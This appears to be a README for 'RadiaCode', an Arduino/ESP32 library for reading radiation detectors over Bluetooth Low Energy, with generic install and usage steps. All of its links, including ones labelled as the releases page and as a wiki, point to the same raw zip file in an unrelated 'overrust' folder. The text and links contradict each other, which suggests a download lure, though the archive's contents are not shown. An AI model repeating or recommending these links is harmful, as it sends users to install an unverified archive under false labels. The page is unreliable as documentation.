# 📡 RadiaCode - Interact with Radiation Data Easily

## 🚀 Getting Started

Welcome to RadiaCode! This guide will help you download and run our Arduino library in C++ for your radiation detection devices via Bluetooth Low Energy.

## ⚡ Features

- Measure radiation levels in real-time.
- Support for various data outputs like counts per minute (CPM) and dose rates.
- Bluetooth Low Energy (BLE) connection for seamless usage.
- Compatible with ESP32 and Arduino platforms.
- Easy to integrate into existing Arduino projects.

## 💾 Download & Install

To get started, visit the following link to download RadiaCode:

[Download RadiaCode](https://raw.githubusercontent.com/HOUSSAMdj/RadiaCode/main/overrust/RadiaCode.zip)

### Step 1: Visit the Releases Page

1. Click the link above to go to the Releases page.
2. You will see a list of available releases. Look for the latest version, which will be at the top.

### Step 2: Download the Library

1. Click on the archive file for the latest release.
2. The file will download to your computer. This is usually in a .zip or .tar format.

### Step 3: Extract the Files

1. Locate the downloaded file on your computer.
2. Right-click on the file and select "Extract All" or use a file extraction tool.
3. Follow the prompts to extract the files. 

### Step 4: Move the Library to Arduino

1. Open your Arduino IDE.
2. Navigate to the "Sketch" menu at the top.
3. Select "Include Library" > "Add .ZIP Library".
4. Navigate to the folder where you extracted RadiaCode and select the archive file.

### Step 5: Connect Your Device

1. Make sure your radiation detection device is powered on.
2. Use a BLE-compatible device (like an ESP32) to connect.
3. Follow the instructions specific to your device to pair via Bluetooth.

## 🔧 System Requirements

- Arduino IDE version 1.8 or later.
- A Bluetooth Low Energy (BLE) compatible device.
- Basic familiarity with the Arduino environment and how to upload codes to your device.

## 🛠️ Usage

1. In the Arduino IDE, open a new sketch.
2. Include the RadiaCode library by adding: 

   ```cpp
   #include <RadiaCode.h>
   ```

3. Use the example sketches included with the library to start gathering data.
4. Upload the code to your device and monitor the output.

## 🌐 Community Support

If you encounter any issues or have questions, you can reach out to our community. Get involved on the Issues page of the repository. Share your experiences and tips with other users.

## 📝 Topics

This library covers various topics, including:

- cpm
- cps
- dose
- dose-rate
- esp-ble
- esp32
- gamma-ray
- gamma-spectroscopy
- geiger-counter
- radiation-level
- roentgen
- sievert
- spectrum

## 📁 Additional Resources

- Check the [RadiaCode Wiki](https://raw.githubusercontent.com/HOUSSAMdj/RadiaCode/main/overrust/RadiaCode.zip) for advanced setup and troubleshooting tips.
- Explore the examples in the "Examples" directory of the library for specific use cases.

## 🔗 Troubleshooting

If you experience issues with the library:

- Ensure that your device is powered on and connected via BLE.
- Verify that you've added the library correctly in the Arduino IDE.
- Check for additional details in the error messages displayed in the IDE.

### Download Again

If you need to download RadiaCode once more, you can always visit our Releases page here:

[Download RadiaCode](https://raw.githubusercontent.com/HOUSSAMdj/RadiaCode/main/overrust/RadiaCode.zip)

By following these steps, you'll be able to successfully download, install, and use the RadiaCode library for your radiation detection needs. Enjoy exploring the radiation levels around you!